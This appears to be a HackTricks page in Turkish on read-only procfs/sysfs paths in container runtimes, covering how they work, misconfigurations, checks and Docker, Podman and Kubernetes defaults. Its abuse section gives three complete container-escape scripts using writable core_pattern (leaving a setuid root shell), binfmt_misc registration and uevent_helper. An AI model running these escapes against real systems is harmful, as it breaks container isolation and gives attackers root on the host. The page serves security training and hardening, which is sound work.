# Salt Okunur Sistem Yolları

{{#include ../../../../banners/hacktricks-training.md}}

Salt okunur sistem yolları, maskelenmiş yollardan ayrı bir korumadır. Bir yolu tamamen gizlemek yerine, runtime onu görünür kılar ancak salt okunur olarak mount eder. Bu, okuma erişiminin kabul edilebilir veya operasyonel olarak gerekli olabileceği, ancak yazmanın çok tehlikeli olacağı seçilmiş procfs ve sysfs konumlarında yaygındır.

Amaç basittir: birçok kernel arayüzü yazılabilir olduğunda çok daha tehlikeli hale gelir. Salt okunur bir mount tüm keşif değerini ortadan kaldırmaz, ancak ele geçmiş bir iş yükünün bu yol aracılığıyla kernel'e bakan dosyaları değiştirmesini engeller.

## İşleyiş

Runtimes sıklıkla proc/sys görünümünün bazı bölümlerini salt okunur olarak işaretler. Runtime ve host'a bağlı olarak, bu şu yolları içerebilir:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Gerçek liste değişebilir, ancak model aynıdır: gerektiğinde görünürlüğe izin ver, varsayılan olarak değişikliğe izin verme.

## Laboratuvar

Docker tarafından belirlenen salt okunur yol listesini inceleyin:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
container içinde monte edilmiş proc/sys görünümünü inceleyin:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Güvenlik Etkisi

Salt okunur sistem yolları, host üzerinde etkili olan geniş bir suistimal sınıfını daraltır. Bir saldırgan procfs veya sysfs'i inceleyebilse bile, oralara yazamamak kernel ayarları, çökme işleyicileri, modül yükleme yardımcıları veya diğer kontrol arayüzlerini içeren birçok doğrudan değiştirme yolunu ortadan kaldırır. Açık tamamen kaybolmaz, ancak bilgi sızıntısından host üzerinde etki oluşturmaya geçiş zorlaşır.

## Yanlış Yapılandırmalar

Ana hatalar, hassas yolların unmask edilmesi veya yeniden mount edilerek read-write yapılması, host proc/sys içeriğinin yazılabilir bind mount'larla doğrudan açığa çıkarılması veya daha güvenli runtime varsayılanlarını etkili şekilde atlayan ayrıcalıklı modların kullanılmasıdır. In Kubernetes, `procMount: Unmasked` ve privileged iş yükleri genellikle daha zayıf proc korumasıyla birlikte görülür. Bir diğer yaygın operasyonel hata, runtime'ın genellikle bu yolları salt okunur olarak mount etmesi nedeniyle tüm iş yüklerinin hâlâ bu varsayılanı devraldığını varsaymaktır.

## Kötüye Kullanım

Eğer koruma zayıfsa, yazılabilir proc/sys girişlerini aramakla başlayın:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Yazılabilir girdiler mevcut olduğunda, yüksek değerli takip yolları şunlardır:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- `/proc/sys` altındaki yazılabilir girdiler genellikle container'ın yalnızca incelemek yerine host kernel davranışını değiştirebilmesi anlamına gelir.
- `core_pattern` özellikle önemlidir çünkü writable bir host-facing değer, bir pipe handler ayarladıktan sonra bir process'i crash ederek host code-execution yoluna dönüştürülebilir.
- `modprobe`, kernel tarafından module-loading ile ilgili akışlarda kullanılan helper'ı açığa çıkarır; yazılabilir olduğunda klasik olarak yüksek-değerli bir hedeftir.
- `binfmt_misc` özelleştirilmiş interpreter registration'unun mümkün olup olmadığını söyler. Eğer registration yazılabilirse, bu sadece bir information leak yerine bir execution primitive haline gelebilir.
- `panic_on_oom`, host-wide bir kernel kararı kontrol eder ve bu yüzden resource exhaustion'ı host denial of service'e dönüştürebilir.
- `uevent_helper`, yazılabilir bir sysfs helper path'inin host-context execution üretebildiğinin en açık örneklerinden biridir.

İlginç bulgular arasında normalde read-only olması gereken writable host-facing proc knobs veya sysfs entries bulunur. Bu noktada workload, kısıtlı bir container görünümünden anlamlı kernel etkisine doğru kaymıştır.

### Tam Örnek: `core_pattern` Host Escape

Eğer `/proc/sys/kernel/core_pattern` container içinden yazılabiliyor ve host kernel görünümüne işaret ediyorsa, bir crash sonrası payload çalıştırmak için kötüye kullanılabilir:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Eğer yol gerçekten host kernel'e ulaşırsa, payload host üzerinde çalışır ve arkada bir setuid shell bırakır.

### Tam Örnek: `binfmt_misc` Kaydı

Eğer `/proc/sys/fs/binfmt_misc/register` yazılabiliyorsa, özelleştirilmiş bir yorumlayıcı kaydı, eşleşen dosya çalıştırıldığında kod yürütmeye yol açabilir:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Host'a bakan yazılabilir bir `binfmt_misc` üzerinde, sonuç kernel tarafından tetiklenen yorumlayıcı yolunda kod yürütülmesidir.

### Tam Örnek: `uevent_helper`

Eğer `/sys/kernel/uevent_helper` yazılabilirse, kernel uygun bir olay tetiklendiğinde host yolundaki bir yardımcı programı çağırabilir:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Bunun bu kadar tehlikeli olmasının nedeni, yardımcı yolun güvenli, yalnızca konteyner bağlamı yerine ana makinenin dosya sistemi açısından çözülmesidir.

## Kontroller

Bu kontroller, procfs/sysfs maruziyetinin beklendiği yerlerde salt okunur olup olmadığını ve iş yükünün hâlâ hassas çekirdek arayüzlerini değiştirip değiştiremeyeceğini belirler.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
- Normal sertleştirilmiş bir iş yükü çok az yazılabilir proc/sys girdisi sunmalıdır.
- Yazılabilir `/proc/sys` yolları genellikle sıradan okuma erişiminden daha önemlidir.
- Eğer runtime bir yolun read-only olduğunu söylüyorsa ama pratikte yazılabilirse, mount propagasyonu, bind mount'lar ve ayrıcalık ayarlarını dikkatle gözden geçirin.

## Çalışma Zamanı Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak etkin | Docker hassas proc girdileri için varsayılan bir salt okunur yol listesi tanımlar | ana makine proc/sys mount'larını açmak, `--privileged` |
| Podman | Varsayılan olarak etkin | Podman, açıkça gevşetilmedikçe varsayılan salt okunur yolları uygular | `--security-opt unmask=ALL`, geniş host mount'ları, `--privileged` |
| Kubernetes | Runtime varsayılanlarını miras alır | Pod ayarları veya host mount'ları tarafından zayıflatılmadıkça altındaki runtime'ın salt okunur yol modelini kullanır | `procMount: Unmasked`, ayrıcalıklı workload'lar, yazılabilir host proc/sys mount'ları |
| containerd / CRI-O under Kubernetes | Runtime varsayılanı | Genellikle OCI/runtime varsayılanlarına dayanır | Kubernetes satırıyla aynı; doğrudan runtime yapılandırma değişiklikleri davranışı zayıflatabilir |

Ana nokta şudur: salt okunur sistem yolları genellikle runtime varsayılanı olarak bulunur, ancak ayrıcalıklı modlar veya host bind mount'ları ile kolayca aşılabilirler.
